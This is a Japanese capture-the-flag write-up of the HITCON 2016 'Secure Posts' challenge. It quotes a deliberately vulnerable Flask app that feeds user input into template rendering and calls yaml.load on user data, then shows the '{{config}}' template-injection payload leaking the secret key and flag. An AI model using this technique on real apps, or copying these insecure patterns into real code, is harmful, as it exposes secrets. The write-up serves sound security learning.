# 問題文

```
Secure Posts

Description
Here is a service that you can store any posts. Can you hack it?
```

# 概要
書籍に関するコメントを投稿するサービスが動いているサーバーからflagを回収する。

# 問題のサーバーにアクセス
すると、コメント投稿部分を持つアプリが動いている。
またソースコードへのリンクがあるので、そこからサーバーアプリのコードを読む。

* python、flaskで出来ている
* json, yamlのどちらかで、コメントを投稿して表示するアプリ
* pickle, evalは、危険だという事で、使えなくなるようにコメントアウトされている
* yamlがユーザーの入力をそのままdumpしたりloadしているので、おそらく狙えるポイントの一つ
* 他にも以下のnameのように、ユーザー入力がそのままrenderされている部分がある

```py
(省略)
# init app
app = Flask(__name__)
app.secret_key = config.flag1
accept_datatype = ['json', 'yaml']
(省略)

def load_yaml(data):
    import yaml
    return yaml.load(data)
(省略)

def render_template(filename, **args):
    with open(safe_join(app.template_folder, filename)) as f:
        template = f.read()
    name = session.get('name', 'anonymous')[:10]
    return render_template_string(template.format(name=name), **args)
(省略)

def load_posts():
    handlers = {
        # disabled insecure data type
        #"eval": load_eval,
        #"pickle": load_pickle,

        "json": load_json,
        "yaml": load_yaml
    }

    datatype = session.get("post_type", config.default_datatype)
    data = session.get("post_data", config.default_data)

    if datatype not in handlers: abort(403)
    return handlers[datatype](data)
```

flaskには、どうやらrender時にユーザー入力が来ていると困る場面があるらしい
* [Injecting Flask](https://nvisium.com/blog/2015/12/07/injecting-flask/)
* [Exploring SSTI in Flask/Jinja2](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/)

とはいえ、今回はname部分は10文字しか入らないので、大した事は出来ない。
とりあえず、設定でも見てみようと、Authorに以下を入力して投稿する。(コード上では、nameにAuthorの値が入るため）

```
{{config}}
```

すると、以下のようにalertが表示される。

<img src="https://github.com/Route9/ctf-writeup/raw/master/hitcon_ctf2016/SecurePosts1/get_alert.png" width="320px">

あとは、OKを押すと、Author部分に以下のようにflagが入って返ってくる。

```
<Config {'SESSION_COOKIE_SECURE': False, 'DEBUG': False, 'SESSION_COOKIE_NAME': 'session', 'JSONIFY_PRETTYPRINT_REGULAR': True, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'PREFERRED_URL_SCHEME': 'http', 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SERVER_NAME': None, 'SEND_FILE_MAX_AGE_DEFAULT': 43200, 'TRAP_HTTP_EXCEPTIONS': False, 'MAX_CONTENT_LENGTH': None, 'TRAP_BAD_REQUEST_ERRORS': False, 'JSON_AS_ASCII': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SESSION_COOKIE_DOMAIN': None, 'USE_X_SENDFILE': False, 'APPLICATION_ROOT': None, 'SESSION_COOKIE_HTTPONLY': True, 'LOGGER_NAME': 'post_manager', 'SESSION_COOKIE_PATH': None, 'SECRET_KEY': 'hitcon{>_<---Do-you-know-<script>alert(1)</script>-is-very-fun?}', 'JSON_SORT_KEYS': True}>
```

# flag

```
hitcon{>_<---Do-you-know-<script>alert(1)</script>-is-very-fun?}
```

# Secure Posts2は解けず・・・。
同一サーバー、同一問題文だったので、おそらく別の解法で、app.secret_keyを表示すると推測。
『yaml, eval, シリアライズ, open辺りは狙い目になる事が多いし、このコードだとyamlかな〜？』と以下のページを見て試行錯誤をしていたが、うまくいかず。。。

* [Dangerous Python Functions, Part 2](https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html)
